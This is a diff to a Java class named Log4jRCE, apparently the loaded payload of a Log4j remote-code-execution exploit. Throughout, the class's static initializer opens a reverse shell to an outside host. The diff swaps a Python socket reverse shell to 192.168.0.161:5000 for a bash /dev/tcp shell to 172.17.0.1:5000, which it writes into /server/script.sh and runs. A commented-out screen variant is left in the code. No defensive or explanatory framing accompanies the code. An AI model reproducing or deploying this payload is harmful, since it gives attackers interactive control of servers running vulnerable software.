@@ -1,14 +1,16 @@
 public class Log4jRCE {
-
     static {
-        try {
-            String[] cmd = {
-                "bash", "-c", 
-                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.161\",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen([\"/bin/bash\",\"-i\"]);' &"
-            };            
-            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+                try {
+                    // "screen -Lmd bash -c 'bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1'"
+                    // doesnt work
+                    Runtime r = Runtime.getRuntime();
+
+                    String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"}; 
+
+                    Process p = r.exec(cmd); // todo
+                    p.waitFor();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
     }
 }
